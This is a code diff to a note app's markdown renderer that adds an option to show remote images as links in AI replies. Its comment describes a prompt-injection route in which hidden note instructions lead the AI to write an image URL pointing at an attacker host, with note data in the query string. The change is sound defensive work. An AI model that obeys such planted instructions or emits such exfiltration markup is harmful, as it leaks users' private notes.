@@ -6,6 +6,11 @@ export interface RenderEnv {
   [key: string]: unknown;
   /** Resolves a wikilink target to a note path (or undefined if missing). */
   resolve?: (target: string) => string | undefined;
+  /**
+   * Show remote images as links instead of loading them. Used for AI replies: a note with hidden
+   * instructions could make the AI write ![](https://attacker/?data=...) and leak note contents.
+   */
+  blockRemoteImages?: boolean;
   /** Path of the note being rendered, for relative image paths. */
   notePath?: string;
   /** All vault files, for ![[image.png]] embeds. */
@@ -120,6 +125,10 @@ md.renderer.rules.image = (tokens, idx, opts, rawEnv, self) => {
   const env = (rawEnv ?? {}) as RenderEnv;
   const token = tokens[idx];
   const src = String(token.attrGet("src") ?? "");
+  if (env.blockRemoteImages && /^[a-z][a-z0-9+.-]*:/i.test(src) && !src.startsWith("vimmi-file:")) {
+    const label = escapeHtml(token.content || src);
+    return /^https?:/i.test(src) ? `<a class="external" href="${escapeHtml(src)}">🖼 ${label}</a>` : label;
+  }
   if (src && !/^[a-z][a-z0-9+.-]*:/i.test(src)) {
     let rel = decodeURI(src).replace(/^\.\//, "");
     if (env.notePath && !rel.startsWith("/")) {
